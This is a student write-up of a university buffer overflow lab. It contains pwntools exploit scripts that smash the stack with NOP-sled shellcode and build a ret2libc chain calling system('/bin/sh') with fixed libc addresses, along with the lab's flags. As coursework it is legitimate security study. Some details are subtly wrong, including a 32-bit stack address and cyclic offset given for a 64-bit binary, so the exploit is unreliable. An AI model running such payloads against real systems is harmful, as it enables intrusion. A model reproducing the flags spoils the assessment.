---
real-name: Jason Todd
csulb-id: "040100110"
handle: red-hood
seed-fingerprint: 1a2b3c
flag1: CECS378{ret_addr_0wned_1a2b3c}
flag2: CECS378{ret2libc_g0t_a_sh3ll_1a2b3c}
honor-flag: CECS378{i_did_my_own_w0rk_redhood_1a2b3c}
---

# After-Action Report -- Buffer Overflow Lab

[--[ 0.0 -- TARGET ]--]

- Course: CECS 378 -- Introduction to Computer Security Principles (Su26, section 01)
- Assignment: Lab 3 -- Buffer Overflow
- Handle: red-hood
- Seed fingerprint: 1a2b3c
- Environment: Ubuntu 22.04 LTS course VM, x86-64, gdb 12.1 with pwndbg, pwntools 4.11
- ASLR: disabled per the handout (`randomize_va_space` = 0), verified before each run
- Binaries: `ace` (Phase Phi, NX off) and `ace_hardened` (Phase Omega, NX on) -- both stamped 1a2b3c in the seed bundle
- Started: 2026-06-24
- Submitted: 2026-06-27

I verified the seed fingerprint 1a2b3c against the assignment portal for both binaries before touching them, so every address below is specific to my seeded copies.

[--[ 1.0 -- RECON ]--]

**Binary 1 -- `ace` (Phase Phi).**

```
$ checksec --file=ace
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```

No canary, executable stack, no PIE -- a textbook stack-smash target. I found the offset with a cyclic pattern:

```
pwndbg> cyclic 200
pwndbg> run < <(cyclic 200)
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c6 in vuln ()
pwndbg> x/wx $rsp
0xffffd7b8: 0x6161616e
pwndbg> cyclic -l naaa
Found at offset 72
```

Offset to the saved return address is **72 bytes** (64-byte buffer + 8 bytes saved RBP). Disassembly confirms the bug:

```
pwndbg> disass vuln
   0x40115a <vuln+4>:   sub    rsp,0x40
   0x40115e <vuln+8>:   lea    rax,[rbp-0x40]
   0x401162 <vuln+12>:  mov    rdi,rax
   0x401165 <vuln+15>:  call   0x401050 <gets@plt>
```

`gets()` into `char buf[64]` -- unbounded read, no bounds check.

**Binary 2 -- `ace_hardened` (Phase Omega).**

```
$ checksec --file=ace_hardened
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Same layout and same 72-byte offset (I re-ran the cyclic pattern to confirm rather than assuming), but **NX is enabled** here -- shellcode on the stack won't execute, so Phase Omega needs a code-reuse attack. I catalogued the libc it's linked against and the gadgets I'd need:

```
$ ldd ace_hardened
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7d8f000)
$ ROPgadget --binary ace_hardened | grep "pop rdi ; ret"
0x0000000000401283 : pop rdi ; ret
```

I also pulled the libc offsets I'd use for the ret2libc chain:

```
pwndbg> p system
$1 = {<text variable>} 0x7ffff7dd4290 <system>
pwndbg> search "/bin/sh"
libc : 0x7ffff7f1d5aa  "/bin/sh"
pwndbg> p exit
$2 = {<text variable>} 0x7ffff7dc7d80 <exit>
```

[--[ 2.0 -- PHASE PHI ACE ]--]

Goal: overwrite the return address and execute execve("/bin/sh") shellcode placed on the stack (NX is off, so this is legal here).

Plan:
1. 72 bytes of padding to reach the saved return address.
2. Overwrite the return address with a stack address inside a NOP sled.
3. NOP sled + 23-byte execve("/bin/sh") shellcode after the return address.

At the crash I read `$rsp` = `0xffffd7b8`, so my payload's sled starts just after the return slot around `0xffffd7c0`. I aimed the return address into the middle of the sled at `0xffffd7e0` to give myself landing margin.

```python
from pwn import *

context.arch = 'amd64'
offset = 72
sled   = b"\x90" * 64
sc     = asm(shellcraft.sh())          # execve("/bin/sh", 0, 0)
ret    = p64(0xffffd7e0)               # into the NOP sled

payload = b"A"*offset + ret + sled + sc

p = process('./ace')
p.sendline(payload)
p.interactive()
```

Result -- shell popped, flag read:

```
$ python3 exploit_phi.py
[+] Starting local process './ace': pid 20817
[*] Switching to interactive mode
$ id
uid=1000(student) gid=1000(student)
$ cat flag1.txt
CECS378{ret_addr_0wned_1a2b3c}
```

flag1: `CECS378{ret_addr_0wned_1a2b3c}`

![phi: RIP overwritten with sled address at crash](screenshots/phi_rip_control.png)

![phi: interactive shell + flag1](screenshots/phi_shell_flag1.png)

[--[ 3.0 -- PHASE OMEGA ACE ]--]

NX is enabled on `ace_hardened`, so I can't run shellcode off the stack. Instead I return into libc and reuse `system("/bin/sh")` -- a ret2libc chain. Four sub-parts below.

**Sub-part 1 -- why shellcode fails here.** With NX (the No-eXecute bit / DEP) enabled, the stack pages are mapped read/write but **not** executable. My Phase Phi payload would still overwrite the return address fine, but the moment the CPU tried to fetch instructions from my stack-resident shellcode it would fault with a segfault (page not executable). So I can control RIP, but I can't point it at bytes I placed on the stack. The fix is to point RIP at code that already exists and is already executable -- libc.

**Sub-part 2 -- gadgets / libc addresses used.** ASLR is disabled for the lab, so libc loads at a fixed base and these addresses are stable across runs:

- `pop rdi ; ret` gadget: `0x0000000000401283` (from the binary itself, PIE off)
- `system`:  `0x00007ffff7dd4290`
- `"/bin/sh"` string in libc: `0x00007ffff7f1d5aa`
- `ret` (bare, for stack alignment): `0x0000000000401284`

**Sub-part 3 -- the ROP chain layout.** After the 72-byte pad I lay down: a bare `ret` to fix the 16-byte stack alignment that `system` requires (movaps will fault otherwise), then `pop rdi` to load the "/bin/sh" pointer into RDI (the first argument register in the System V ABI), then `system`:

```python
from pwn import *

offset      = 72
pop_rdi     = p64(0x401283)
ret_align   = p64(0x401284)       # alignment ret before system
binsh       = p64(0x7ffff7f1d5aa)
system      = p64(0x7ffff7dd4290)

payload  = b"A"*offset
payload += ret_align              # 16-byte alignment fix
payload += pop_rdi + binsh        # rdi = &"/bin/sh"
payload += system                 # system("/bin/sh")

p = process('./ace_hardened')
p.sendline(payload)
p.interactive()
```

The stack, top to bottom after the overflow, reads: `[ret] -> [pop rdi] -> [&"/bin/sh"] -> [system]`. When `vuln` returns it hits the alignment `ret`, then `pop rdi` eats the `/bin/sh` pointer and returns into `system`, which finds its argument already in RDI.

**Sub-part 4 -- proof of shell + flag2.**

```
$ python3 exploit_omega.py
[+] Starting local process './ace_hardened': pid 20955
[*] Switching to interactive mode
$ id
uid=1000(student) gid=1000(student)
$ cat flag2.txt
CECS378{ret2libc_g0t_a_sh3ll_1a2b3c}
```

The first time I ran it without the alignment `ret` it crashed inside `system` on a `movaps` instruction -- classic 16-byte alignment fault. Adding the extra `ret` gadget to nudge the stack back to a 16-byte boundary fixed it, which is a subtlety I want to flag because it cost me an hour.

flag2: `CECS378{ret2libc_g0t_a_sh3ll_1a2b3c}`

![omega: gadget addresses from ROPgadget + gdb](screenshots/omega_gadgets.png)

![omega: ret2libc shell + flag2](screenshots/omega_shell_flag2.png)

[--[ 4.0 -- AFTERMATH ]--]

**Reflection 1 -- controlling RIP is the whole ballgame.** The mental model that finally locked in for me is that both phases are the *same* attack up to the moment of the return -- overwrite the saved return address at offset 72. Everything after that is just "what do I point RIP at, given the defenses in front of me?" NX off means I can point it at my own bytes; NX on means I have to point it at somebody else's bytes (libc). Seeing that both exploits share the first 72 bytes verbatim made the ROP chain feel like a variation on a theme instead of a new monster.

**Reflection 2 -- the alignment bug taught me to read faults literally.** Losing an hour to the `movaps` alignment crash was frustrating in the moment but genuinely instructive. The fault address pointed into `system`, not into my chain, which almost sent me debugging the wrong thing. Learning that modern glibc uses SSE instructions that require a 16-byte-aligned stack -- and that a single extra `ret` gadget fixes it -- is the kind of gotcha you only really internalize by hitting it.

**Reflection 3 -- how thin these defenses are with ASLR off.** ret2libc only worked because ASLR was disabled and I could hardcode `system` and the "/bin/sh" string at fixed addresses. With ASLR on I'd have needed an information leak first to defeat the randomized libc base. It made the layered nature of these mitigations concrete for me: NX alone stops naive shellcode, but NX + ASLR together is what actually raises the bar, because you have to *both* reuse existing code *and* first learn where it lives.

**Reflection 4 -- what I'd do as the defender.** If I were shipping this binary, the cheapest wins are obvious in hindsight: replace `gets()` with `fgets()` and a length, compile with `-fstack-protector-strong` for a canary, keep NX and PIE on, and let ASLR do its job. Any single one of those breaks the exploit I just wrote; all four together make it close to hopeless without a separate memory-disclosure bug. This lab was the first time "defense in depth" stopped being a slogan and became a checklist I actually believe in.
